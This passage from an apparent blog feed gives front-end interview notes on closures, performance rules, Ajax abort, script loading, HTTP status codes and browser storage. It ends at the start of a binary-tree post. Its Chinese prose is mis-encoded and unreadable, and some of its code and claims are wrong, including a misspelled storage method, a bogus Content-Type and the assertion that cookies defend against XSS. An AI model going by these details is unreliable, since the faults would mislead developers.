class="number">2</span>,<span class="number">3</span>]);</div><div class="line">    <span class="comment">// Using j only to help prevent confusion -- could use i.</span></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; fnlist.length; j++) &#123;</div><div class="line">        fnlist[j]();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">testList();    <span class="comment">// "item3 undefined" for 3 times</span></div><div class="line"><span class="comment">// because closure is a reference, when the loop in buildList() is complete, i has turned to 3, so list[3] is undefined.</span></div><div class="line"></div><div class="line"><span class="comment">/***************************************************************************/</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayAlice</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> sayAlert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; alert(alice); &#125;</div><div class="line">    <span class="comment">// Local variable that ends up within closure</span></div><div class="line">    <span class="keyword">var</span> alice = <span class="string">'Hello Alice'</span>;</div><div class="line">    <span class="keyword">return</span> sayAlert;</div><div class="line">&#125;</div><div class="line">sayAlice()();</div><div class="line"></div><div class="line"><span class="comment">/*********************************************************************/</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">newClosure</span>(<span class="params">someNum, someRef</span>) </span>&#123;</div><div class="line">    <span class="comment">// Local variables that end up within closure</span></div><div class="line">    <span class="keyword">var</span> num = someNum;</div><div class="line">    <span class="keyword">var</span> anArray = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</div><div class="line">    <span class="keyword">var</span> ref = someRef;</div><div class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</div><div class="line">        num += x;</div><div class="line">        anArray.push(num);</div><div class="line">        alert(<span class="string">'num: '</span> + num +</div><div class="line">            <span class="string">'\nanArray '</span> + anArray.toString() +</div><div class="line">            <span class="string">'\nref.someVar '</span> + ref.someVar);</div><div class="line">        &#125;</div><div class="line">&#125;</div><div class="line">obj = &#123;<span class="attr">someVar</span>: <span class="number">4</span>&#125;;</div><div class="line">fn1 = newClosure(<span class="number">4</span>, obj);</div><div class="line">fn2 = newClosure(<span class="number">5</span>, obj);</div><div class="line">fn1(<span class="number">1</span>); <span class="comment">// num: 5; anArray: 1,2,3,5; ref.someVar: 4;</span></div><div class="line">fn2(<span class="number">1</span>); <span class="comment">// num: 6; anArray: 1,2,3,6; ref.someVar: 4;</span></div><div class="line">obj.someVar++;</div><div class="line">fn1(<span class="number">2</span>); <span class="comment">// num: 7; anArray: 1,2,3,5,7; ref.someVar: 5;</span></div><div class="line">fn2(<span class="number">2</span>); <span class="comment">// num: 8; anArray: 1,2,3,6,8; ref.someVar: 5;</span></div></pre></td></tr></table></figure><h4 id="å‰ç«¯æ€§èƒ½ä¼˜åŒ–"><a href="#å‰ç«¯æ€§èƒ½ä¼˜åŒ–" class="headerlink" title="å‰ç«¯æ€§èƒ½ä¼˜åŒ–"></a>å‰ç«¯æ€§èƒ½ä¼˜åŒ–</h4><p>æƒå¨å‘å¸ƒï¼š<a href="https://developer.yahoo.com/performance/rules.html" target="_blank" rel="external">Best Practices for Speeding Up Your Web Site</a></p><p>æ¥è‡ªï¼š<a href="https://github.com/fouber/blog/issues/3#issuecomment-150230758" target="_blank" rel="external">å‰ç«¯å·¥ç¨‹ä¸æ€§èƒ½ä¼˜åŒ– â€“ fouber</a></p><table><thead><tr><th>ä¼˜åŒ–æ–¹å‘</th><th>ä¼˜åŒ–æ‰‹æ®µ</th></tr></thead><tbody><tr><td>è¯·æ±‚æ•°é‡</td><td>åˆå¹¶è„šæœ¬å’Œæ ·å¼è¡¨ï¼ŒCSS Spritesï¼Œæ‹†åˆ†åˆå§‹åŒ–è´Ÿè½½ï¼Œåˆ’åˆ†ä¸»åŸŸï¼Œwebpack</td></tr><tr><td>è¯·æ±‚å¸¦å®½</td><td>å¼€å¯GZipï¼Œç²¾ç®€JavaScriptï¼Œç§»é™¤é‡å¤è„šæœ¬ï¼Œå›¾åƒä¼˜åŒ–</td></tr><tr><td>ç¼“å­˜åˆ©ç”¨</td><td>ä½¿ç”¨CDNï¼Œä½¿ç”¨å¤–éƒ¨JavaScriptå’ŒCSSï¼Œæ·»åŠ Expireså¤´ï¼Œå‡å°‘DNSæŸ¥æ‰¾ï¼Œé…ç½®ETagï¼Œä½¿AjaXå¯ç¼“å­˜</td></tr><tr><td>é¡µé¢ç»“æ„</td><td>å°†æ ·å¼è¡¨æ”¾åœ¨é¡¶éƒ¨ï¼Œå°†è„šæœ¬æ”¾åœ¨åº•éƒ¨ï¼Œå°½æ—©åˆ·æ–°æ–‡æ¡£çš„è¾“å‡º</td></tr><tr><td>ä»£ç æ ¡éªŒ</td><td>é¿å…CSSè¡¨è¾¾å¼ï¼Œé¿å…é‡å®šå‘</td></tr></tbody></table><p>ä»€ä¹ˆæ˜¯ CSS è¡¨è¾¾å¼ï¼Œæ¯”å¦‚è¿™ä¸ªï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">body</span> &#123;</div><div class="line">    <span class="attribute">background-color</span>: <span class="built_in">expression</span>((new Date()).<span class="built_in">getHours</span>()%<span class="number">2</span> ? <span class="string">"#B8D4FF"</span> : <span class="string">"#F08A00"</span> );</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>è¿™ç§å†™æ³•å§‹äº IE5ï¼Œç»ˆäº IE8ï¼Œè§£é‡Šï¼š <a href="http://blogs.msdn.com/b/ie/archive/2008/10/16/ending-expressions.aspx" target="_blank" rel="external">Ending Expressions</a>ã€‚</p><h4 id="å–æ¶ˆä¸€ä¸ª-Ajax-è¯·æ±‚"><a href="#å–æ¶ˆä¸€ä¸ª-Ajax-è¯·æ±‚" class="headerlink" title="å–æ¶ˆä¸€ä¸ª Ajax è¯·æ±‚"></a>å–æ¶ˆä¸€ä¸ª Ajax è¯·æ±‚</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> xmlHttp;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;</div><div class="line">    xmlHttp = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">    xmlHttp = <span class="keyword">new</span> ActiveXObject(<span class="string">'Msxml2.XMLHTTP'</span>);</div><div class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        xmlHttp = <span class="keyword">new</span> ActiveXObject(<span class="string">'Microsoft.XMLHttp'</span>);</div><div class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!xmlHttp) &#123;</div><div class="line">    <span class="built_in">console</span>.error(<span class="string">'Your browser don\'t support XMLHttp Object'</span>)</div><div class="line">&#125;</div><div class="line"></div><div class="line">xmlHttp.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">    <span class="keyword">if</span> (xmlHttp.readyState === <span class="number">4</span> &amp;&amp; xmlHttp.status === <span class="number">200</span>) &#123;</div><div class="line">        <span class="built_in">console</span>.log(xmlHttp.responseText/responseJSON/responseXML/response);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="built_in">console</span>.error(<span class="string">'error'</span>);</div><div class="line">    &#125;</div><div class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</div><div class="line">    <span class="built_in">console</span>.error(e.description);</div><div class="line">    &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">xmlHttp.open(<span class="string">'POST'</span>, url, <span class="literal">true</span>);</div><div class="line">xmlHttp.setRequestHeader(<span class="string">'Content-Type'</span>, <span class="string">'application/x-www-form-data'</span>);</div><div class="line">xmlHttp.send(<span class="string">'a=2&amp;b=1'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (xmlHttp.readyState === <span class="number">3</span>) xmlHttp.abort();</div></pre></td></tr></table></figure><h4 id="script-å±æ€§-async-defer-åŒºåˆ«"><a href="#script-å±æ€§-async-defer-åŒºåˆ«" class="headerlink" title="script å±æ€§ async, defer åŒºåˆ«"></a>script å±æ€§ async, defer åŒºåˆ«</h4><p><code>&lt;script&gt;&lt;/script&gt;;</code> åŒæ­¥åŠ è½½ï¼Œåœ¨æµè§ˆå™¨è§£æ DOM ä¹‹å‰åŠ è½½ï¼Œå¯èƒ½ä¼šå µå¡çº¿ç¨‹</p><p><code>&lt;script async&gt;&lt;/script&gt;</code> å¼‚æ­¥åŠ è½½ï¼Œåœ¨æµè§ˆå™¨è§£æ DOM çš„åŒæ—¶åŠ è½½</p><p><code>&lt;script defer&gt;&lt;/script&gt;</code> åœ¨æµè§ˆå™¨è§£æ DOM å®Œæˆä¹‹ååŠ è½½</p><h4 id="JSONP-è·¨åŸŸçš„åŸç†"><a href="#JSONP-è·¨åŸŸçš„åŸç†" class="headerlink" title="JSONP è·¨åŸŸçš„åŸç†"></a>JSONP è·¨åŸŸçš„åŸç†</h4><p>åŠ¨æ€æ·»åŠ ä¸€ä¸ª <code>script</code> æ ‡ç­¾ï¼Œ<code>sciprt</code> å†…çš„ <code>scr</code> å±æ€§æ˜¯ä¸å—åŒæºç­–ç•¥å½±å“çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ JSONP çš„æ–¹å¼å’Œ <code>Ajax</code> åè®®æ˜¯æ²¡æœ‰å…³ç³»çš„ï¼Œè¿™å’Œ <code>&lt;image src&gt;</code> æ˜¯åŒæ ·é“ç†ã€‚</p><h4 id="Redux-æœ€é‡è¦çš„å‡ ä¸ªæ¦‚å¿µ"><a href="#Redux-æœ€é‡è¦çš„å‡ ä¸ªæ¦‚å¿µ" class="headerlink" title="Redux æœ€é‡è¦çš„å‡ ä¸ªæ¦‚å¿µ"></a>Redux æœ€é‡è¦çš„å‡ ä¸ªæ¦‚å¿µ</h4><p><a href="http://redux.js.org/docs/api/Store.html" target="_blank" rel="external">store</a>, <strong>state</strong>, <strong>dispatch</strong></p><h4 id="HTTP-è¯·æ±‚æ–¹æ³•"><a href="#HTTP-è¯·æ±‚æ–¹æ³•" class="headerlink" title="HTTP è¯·æ±‚æ–¹æ³•"></a>HTTP è¯·æ±‚æ–¹æ³•</h4><p>GET, POST, HEAD, PUT, DELETE, OPTIONS, TRACE, CONNECT</p><h4 id="HTTP-çŠ¶æ€å“åº”ç "><a href="#HTTP-çŠ¶æ€å“åº”ç " class="headerlink" title="HTTP çŠ¶æ€å“åº”ç "></a>HTTP çŠ¶æ€å“åº”ç </h4><h5 id="1-Information-è¯·æ±‚æ”¶åˆ°ï¼Œç»§ç»­å¤„ç†"><a href="#1-Information-è¯·æ±‚æ”¶åˆ°ï¼Œç»§ç»­å¤„ç†" class="headerlink" title="1** Information è¯·æ±‚æ”¶åˆ°ï¼Œç»§ç»­å¤„ç†"></a>1** Information è¯·æ±‚æ”¶åˆ°ï¼Œç»§ç»­å¤„ç†</h5><ul><li>100 Continue å®¢æˆ·å¿…é¡»ç»§ç»­å‘å‡ºè¯·æ±‚*   101 Switch Protocols å®¢æˆ·è¦æ±‚æœåŠ¡å™¨æ ¹æ®è¯·æ±‚è½¬æ¢ HTTP åè®®ç‰ˆæœ¬ <!--more--></li></ul><h5 id="2-Successful-æ“ä½œæˆåŠŸæ”¶åˆ°ï¼Œåˆ†æã€æ¥å—"><a href="#2-Successful-æ“ä½œæˆåŠŸæ”¶åˆ°ï¼Œåˆ†æã€æ¥å—" class="headerlink" title="2** Successful æ“ä½œæˆåŠŸæ”¶åˆ°ï¼Œåˆ†æã€æ¥å—"></a>2** Successful æ“ä½œæˆåŠŸæ”¶åˆ°ï¼Œåˆ†æã€æ¥å—</h5><ul><li>200 OK è¯·æ±‚æˆåŠŸ</li><li>201 Created æç¤ºçŸ¥é“æ–°é—»ç•Œçš„ URL</li><li>202 Accepted æ¥å—å¤„ç†ï¼Œä½†å¤„ç†æœªå®Œæˆ</li><li>203 Non-Authoritative Information è¿”å›ä¿¡æ¯ä¸ç¡®å®šæˆ–ä¸å®Œæ•´</li><li>204 No Content è¯·æ±‚æ”¶åˆ°ï¼Œä½†è¿”å›ä¿¡æ¯ä¸ºç©º</li><li>205 Reset Content æœåŠ¡å™¨å®Œæˆäº†è¯·æ±‚ï¼Œç”¨æˆ·ä»£ç†å¿…é¡»å¤ä½å½“å‰å·²ç»æµè§ˆè¿‡çš„æ–‡ä»¶</li><li>206 Partial Content æœåŠ¡å™¨å·²ç»å®Œæˆäº†éƒ¨åˆ†ç”¨æˆ·çš„ GET è¯·æ±‚</li></ul><h5 id="3-Redirection-é‡å®šå‘"><a href="#3-Redirection-é‡å®šå‘" class="headerlink" title="3** Redirection é‡å®šå‘"></a>3** Redirection é‡å®šå‘</h5><ul><li>300 Multiple Choices è¯·æ±‚çš„èµ„æºå¯åœ¨å¤šå¤„å¾—åˆ°</li><li>301 Moved Permanently æ°¸ä¹…è·³è½¬</li><li>302 Found åœ¨å…¶ä»–åœ°å€å‘ç°äº†è¯·æ±‚æ•°æ®</li><li>303 See Other å»ºè®®å®¢æˆ·è®¿é—®å…¶ä»– URL æˆ–è®¿é—®æ–¹å¼</li><li>304 Not Modified å®¢æˆ·ç«¯æ„è§æ‰§è¡Œäº† GETï¼Œä½†æ–‡ä»¶æœªå˜åŒ–</li><li>305 Use Proxy è¯·æ±‚çš„èµ„æºå¿…é¡»ä»æœåŠ¡å™¨æŒ‡å®šçš„åœ°å€å¾—åˆ°</li><li>306 Unused å‰ä¸€ç‰ˆæœ¬ HTTP ä¸­ä½¿ç”¨çš„ä»£ç ï¼Œç°è¡Œç‰ˆæœ¬ä¸­ä¸å†ä½¿ç”¨</li><li>307 Temporary Redirect ç”³æ˜è¯·æ±‚çš„èµ„æºä¸´æ—¶æ€§åˆ é™¤</li></ul><h5 id="4-Client-Error"><a href="#4-Client-Error" class="headerlink" title="4** Client Error"></a>4** Client Error</h5><ul><li>400 Bad Request é”™è¯¯è¯·æ±‚ï¼Œå¦‚è¯­æ³•é”™è¯¯</li><li>401 Unauthorized æœªæˆæƒ</li><li>402 Payment Required åŸŸåä¿ç•™ä¸ºæœªæ¥ä½¿ç”¨</li><li>403 Forbidden ç¦æ­¢è®¿é—®</li><li>404 Not Found æ‰¾ä¸åˆ°æ–‡ä»¶ã€æŸ¥è¯¢æˆ– URL</li><li>405 Method Not Allowed å½“å‰ HTTP è¯·æ±‚æ–¹æ³•ä¸è¢«å…è®¸</li><li>406 Not Acceptable æ ¹æ®ç”¨æˆ·å‘é€çš„ Acceptï¼Œè¯·æ±‚èµ„æºä¸å¯è®¿é—® â€¦</li></ul><h5 id="5-Server-Error"><a href="#5-Server-Error" class="headerlink" title="5** Server Error"></a>5** Server Error</h5><ul><li>500 Internal Server Error å†…éƒ¨æœåŠ¡å™¨é”™è¯¯</li><li>501 Not Implemented æœåŠ¡å™¨ä¸æ”¯æŒéœ€è¦ç”¨æ¥å®Œæˆè¯·æ±‚çš„å‡½æ•°</li><li>502 Bad Gateway ç½‘å…³é”™è¯¯</li><li>503 Service Unavailable æœåŠ¡å™¨ç»´æŠ¤ä¸­æˆ–è¿‡è½½</li><li>504 Gateway Timeout ç½‘å…³è¶…æ—¶</li><li>505 Http Version Not Supported ä¸æ”¯æŒçš„ HTTP ç‰ˆæœ¬</li></ul><h5 id="å‚è€ƒ-2"><a href="#å‚è€ƒ-2" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h5><ul><li><a href="http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html" target="_blank" rel="external">http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html</a></li><li><a href="http://nonfu.me/p/6888.html" target="_blank" rel="external">http://nonfu.me/p/6888.html</a></li></ul><h4 id="cookie-localStorage-å’Œ-sessionStorage-çš„å¼‚åŒ"><a href="#cookie-localStorage-å’Œ-sessionStorage-çš„å¼‚åŒ" class="headerlink" title="cookie, localStorage å’Œ sessionStorage çš„å¼‚åŒ"></a>cookie, localStorage å’Œ sessionStorage çš„å¼‚åŒ</h4><h5 id="ç›¸åŒç‚¹"><a href="#ç›¸åŒç‚¹" class="headerlink" title="ç›¸åŒç‚¹"></a>ç›¸åŒç‚¹</h5><ul><li>éƒ½å±äºå®¢æˆ·ç«¯æˆ–æµè§ˆå™¨å­˜å‚¨æœºåˆ¶</li><li>éƒ½å…·æœ‰åŒæºå®‰å…¨ç­–ç•¥</li></ul><h5 id="ä¸åŒç‚¹"><a href="#ä¸åŒç‚¹" class="headerlink" title="ä¸åŒç‚¹"></a>ä¸åŒç‚¹</h5><p>localStorage å’Œ sessionStorage æ˜¯ HTML5 çš„æ–° APIsï¼Œæ„å‘³ç€ä¸æ˜¯æ‰€æœ‰æµè§ˆå™¨éƒ½æ”¯æŒï¼Œç°ä»£æµè§ˆå™¨åŸºæœ¬éƒ½æ”¯æŒã€‚</p><p>sessionStorage å­˜å‚¨çš„ä¿¡æ¯ä¼šåœ¨æµè§ˆå™¨å…³é—­åæ¸…é™¤ï¼Œä½†é¡µé¢å…³é—­è€Œæµè§ˆå™¨ä¸å…³é—­åˆ™ä¸ä¼šè¢«æ¸…é™¤ï¼Œé¡¾åæ€ä¹‰ï¼Œå…¶åªå­˜æ´»åœ¨ä¸€ä¸ªæµè§ˆå™¨ä¼šè¯ä¸­ã€‚ å¦‚æœä½ å¸Œæœ›ä¿å­˜çš„ä¿¡æ¯åœ¨æµè§ˆå™¨å…³é—­é‡å¼€åè¿˜èƒ½ä½¿ç”¨ï¼Œåˆ™åº”è¯¥ç”¨ localStorageã€‚</p><p>localStorage å’Œ sessionStorage åº”è¯¥ç”¨æ¥ä¿å­˜éæ•æ„Ÿå¹¶ä¸”éœ€è¦åœ¨åŒæºé¡µé¢é—´ä½¿ç”¨çš„ä¿¡æ¯ï¼Œä¸¤è€…éƒ½èƒ½è¢«å®¢æˆ·ç«¯æˆ–æµè§ˆå™¨è½»æ˜“è¯»å–å’Œæ”¹å˜ï¼Œæ‰€ä»¥ä¸åº”è¯¥ä¾èµ–è¿™ä¸¤è€…ä¿å­˜æ•æ„Ÿæˆ–å®‰å…¨ä¿¡æ¯ã€‚</p><p>æŸ¥çœ‹æµè§ˆå™¨æ˜¯å¦æ”¯æŒ localStorage å’Œ sessionStorageï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">window</span>.localStorage != <span class="literal">undefined</span>;</div><div class="line"><span class="built_in">window</span>.sessionStorage != <span class="literal">undefined</span></div><div class="line"></div><div class="line">localStorage å’Œ sessionStorage åŸºæœ¬æ“ä½œï¼š</div><div class="line"></div><div class="line">localStorage.setItem(<span class="string">'foo'</span>, <span class="string">'bar'</span>);</div><div class="line">localStorage[<span class="string">'foo'</span>] = <span class="string">'bar'</span>;</div><div class="line">localStorage.foo = <span class="string">'bar'</span></div><div class="line">localStorage.getItem(<span class="string">'foo'</span>);    <span class="comment">// bar</span></div><div class="line">localStorage.remvoeItem(<span class="string">'foo'</span>);</div><div class="line">localStorage.clear();</div><div class="line"></div><div class="line">sessionStorage.setItem(<span class="string">'foo'</span>, <span class="string">'bar'</span>);</div><div class="line">sessionStorage[<span class="string">'foo'</span>] = <span class="string">'bar'</span>;</div><div class="line">sessionStorage.foo = <span class="string">'bar'</span>;</div><div class="line">sessionStorage.getItem(<span class="string">'foo'</span>);  <span class="comment">// bar</span></div><div class="line">sessionStorage.remvoeItem(<span class="string">'foo'</span>);</div><div class="line">sessionStorage.clear();</div></pre></td></tr></table></figure><p>å…³ç³»åˆ°æ•æ„Ÿä¿¡æ¯åˆ™åº”è¯¥ç”¨ cookieï¼Œå› ä¸ºcookie ç›¸å¯¹è¾ƒéš¾è¢«ç”¨æˆ·è¯»å–å’Œå†™å…¥ï¼Œä½†å¦‚æœç”¨é SSL ä¼ è¾“ï¼Œcookie åŒæ ·å¯èƒ½åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­è¢«æˆªå–ï¼Œå°¤å…¶æ˜¯åœ¨ç”¨ä¸€ä¸ªå…¬å…± wifiã€‚</p><p>cookie å®‰å…¨ç­‰çº§æ¯”å‰ä¸¤è€…é«˜ï¼Œå®ƒå¯ä»¥æœ‰æ•ˆé˜²å¾¡ XSS(Cross-Site Scripting)ã€‚å› æ­¤å¯ä»¥ä½¿ç”¨ cookie æ¥å­˜å‚¨ä¸€äº›éªŒè¯ä¿¡æ¯ï¼Œæ¯”å¦‚ç™»é™† tokenæˆ–å¹¿å‘Šå•†çš„ç”¨æˆ·è¿½è¸ªã€‚</p><p>cookie å¤§å¤šè¢«ç”¨æ¥éªŒè¯ç”¨æˆ·æ•°æ®ï¼Œåœ¨åŒæºå†…ï¼Œé¡µé¢æœ¬èº« HTTP è¯·æ±‚åŒ…æ‹¬å…¶å†…éƒ¨çš„ Ajax è¯·æ±‚ã€å›¾ç‰‡ã€æ ·å¼ã€è„šæœ¬å’Œå­—ä½“çš„ HTTP å¤´éƒ½åŒ…å« cookieï¼Œå› ä¸ºä¸åº”è¯¥ç”¨ cookie å­˜å‚¨å¤§é‡æ•°æ®ï¼Œäº‹å®ä¸Šæµè§ˆå™¨ä¼šå¯¹è¿‡é•¿ cookie è¿›è¡Œæˆªå–çš„ã€‚</p><p>cookie æœ¬èº«æ˜¯ä¸€æ®µå­—ç¬¦ä¸²ï¼ŒsessionStorage å’Œ localStorage åˆ™æ˜¯ä»¥ JavaScript primitives(JSON serialise) å½¢å¼ä¿å­˜ï¼Œå¯è¯»æ€§å¾ˆé«˜ã€‚</p><p>æå– cookie ä½œä¸ºå¯¹è±¡è¿”å›ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> cookieArr = <span class="built_in">document</span>.cookie.split(<span class="string">'; '</span>);</div><div class="line">    <span class="keyword">var</span> cookieObj = &#123;&#125;;</div><div class="line">    cookieArr.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">v, k</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> firstEqualSign = v.indexOf(<span class="string">'='</span>);</div><div class="line">        <span class="keyword">var</span> cookieKey = v.slice(<span class="number">0</span>, firstEqualSign);</div><div class="line">        <span class="keyword">var</span> cookieVal = v.slice(firstEqualSign + <span class="number">1</span>);</div><div class="line">        cookieObj[cookieKey] = cookieVal;</div><div class="line">    &#125;);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> cookieObj;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h5 id="å‚è€ƒ-3"><a href="#å‚è€ƒ-3" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h5><ul><li><a href="http://stackoverflow.com/questions/19867599/what-is-the-difference-between-localstorage-sessionstorage-session-and-cookies" target="_blank" rel="external">What is the difference between localStorage, sessionStorage, session and cookies?</a></li><li><a href="http://diveintohtml5.info/storage.html" target="_blank" rel="external">THE PAST, PRESENT &amp; FUTURE OF LOCAL STORAGE FOR WEB APPLICATIONS</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API" target="_blank" rel="external">Using the Web Storage API</a></li></ul><h4 id="æ€»å‚è€ƒ"><a href="#æ€»å‚è€ƒ" class="headerlink" title="æ€»å‚è€ƒ"></a>æ€»å‚è€ƒ</h4><ul><li><a href="http://www.cnblogs.com/whitewolf/archive/2013/04/16/3024843.html" target="_blank" rel="external">http://www.cnblogs.com/whitewolf/archive/2013/04/16/3024843.html</a></li><li><a href="http://stackoverflow.com/questions/111102/how-do-javascript-closures-work" target="_blank" rel="external">http://stackoverflow.com/questions/111102/how-do-javascript-closures-work</a></li><li><a href="http://www.sitepoint.com/key-differences-post/" target="_blank" rel="external">http://www.sitepoint.com/key-differences-post/</a></li><li><a href="http://stackoverflow.com/questions/4775722/check-if-object-is-array" target="_blank" rel="external">http://stackoverflow.com/questions/4775722/check-if-object-is-array</a></li><li><a href="http://stackoverflow.com/questions/6490252/vertically-centering-a-div-inside-another-div" target="_blank" rel="external">http://stackoverflow.com/questions/6490252/vertically-centering-a-div-inside-another-div</a></li><li><a href="http://stackoverflow.com/questions/5076944/what-is-the-difference-between-null-and-undefined-in-javascript" target="_blank" rel="external">http://stackoverflow.com/questions/5076944/what-is-the-difference-between-null-and-undefined-in-javascript</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;æ¸…é™¤æµ®åŠ¨&quot;&gt;&lt;a href=&quot;#æ¸…é™¤æµ®åŠ¨&quot; class=&quot;headerlink&quot; title=&quot;æ¸…é™¤æµ®åŠ¨&quot;&gt;&lt;/a&gt;æ¸…é™¤æµ®åŠ¨&lt;/h4&gt;&lt;h5 id=&quot;clear&quot;&gt;&lt;a href=&quot;#clear&quot; class=&quot;headerlink&quot; title=&quot;clear&quot;&gt;&lt;/a&gt;clear&lt;/h5&gt;&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* æ”¾åœ¨æµ®åŠ¨å…ƒç´ ä¹‹åæ¸…é™¤æµ®åŠ¨ */&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;selector-class&quot;&gt;.clear&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attribute&quot;&gt;clear&lt;/span&gt;: both;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
  </entry>
  
  <entry>
    <title>JavaScript äºŒå‰æ ‘</title>
    <link href="http://youngdze.co/2015/10/22/javascript-binary-search-tree/"/>
    <id>http://youngdze.co/2015/10/22/javascript-binary-search-tree/</id>
    <published>2015-10-22T10:50:24.000Z</published>
    <updated>2016-12-05T04:55:42.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>åƒæˆ‘è¿™ç§é‡ç”Ÿç¨‹åºå‘˜è¿å„å¤§å…¬å¸æ ¡æ‹›ç¬”è¯•éƒ½è¿‡ä¸äº†ï¼Œä¸»è¦æ˜¯æ•°æ®ç»“æ„å’Œç®—æ³•è–„å¼±ï¼Œä»Šå¤©å°ç±³å‡ºäº†é“äºŒå‰æ ‘ï¼Œè€ƒäºŒå‰æ ‘çš„åˆ†å±‚éå†ï¼Œæˆ‘å½“ç„¶æ˜¯ä¸ä¼šåšï¼Œç„¶åå°±æ²¡æœ‰ç„¶åäº†ã€‚</p></blockquote><h4 id="èŠ‚ç‚¹å®šä¹‰"><a href="#èŠ‚ç‚¹å®šä¹‰" class="headerlink" title="èŠ‚ç‚¹å®šä¹‰"></a>èŠ‚ç‚¹å®šä¹‰</h4><p>äºŒå‰æ ‘èŠ‚ç‚¹å®šä¹‰ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Node</span>(<span class="params">data, left, right</span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.data = data;</div><div class="line">    <span class="keyword">this</span>.left = left;</div><div class="line">    <span class="keyword">this</span>.right = right;</div><div class="line">&#125;</div></pre></td></tr></table></figure><a id="more"></a><p>ç»™ <code>Node</code> æ·»åŠ 